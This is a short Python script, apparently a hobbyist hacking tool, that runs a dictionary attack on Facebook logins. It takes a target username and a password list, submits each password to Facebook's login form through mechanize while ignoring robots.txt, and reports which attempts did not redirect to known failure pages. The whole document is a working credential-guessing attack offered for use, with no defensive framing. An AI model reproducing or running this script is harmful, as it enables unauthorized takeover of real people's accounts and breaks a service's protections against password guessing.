import subprocess
subprocess.run('clear')
        
print ("         \033[1;31;40m▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄    ▄▄▄▄▄▄")
print ("         ██▀▀▀▀▀▀  ██▀▀▀▀██  ██▀▀▀▀██")
print ("         ██        ██    ██  ██    ██")
print ("         \033[1;32;40m███████   ███████   ███████")
print ("         ██        ██    ██  ██    ██")
print ("         ██        ██▄▄▄▄██  ██▄▄▄▄██")
print ("         ▀▀        ▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀")
print (" ")

print ('[+]=>Facebook login dictonary attack<=[+]')
print ('[+]=>\033[1;36;40mBy Anonymous Joker\033[1;32;40m<=[+]')

print (" ")



import mechanize


e=input('\033[1;35;40m[+]Enter Username '+'\033[1;32;40m: ')

d=input('\033[1;35;40m[+]Enter Password list Path '+'\033[1;32;40m: ')

wl=open(d,'r').readlines()

for lines in wl:
        pw=lines.strip()
        br=mechanize.Browser()
        br.set_handle_robots(False)
        br.open('https://www.facebook.com/login.php')
        br.select_form(nr=0)
        br.form['email']=e
        br.form['pass']=pw
        sub=br.submit()
        q=sub.geturl()
        if q=='https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100':
                print ('\033[1;31;40mIncorrect')
        elif q=='https://www.facebook.com/recover/code/?ars=contact_point_login&em%5B0%5D=d%2A%2A%2A%2A%2A%2A%2A%2A%2Au%40gmail.com&spc=0&fl=three_login_attempts_failure&hash=AUbRvWx7ytuk9wSV':
                print ('Incorrect')
        else:
                print ('[+] '+pw+'\033[1;32;40m Check this '+q)

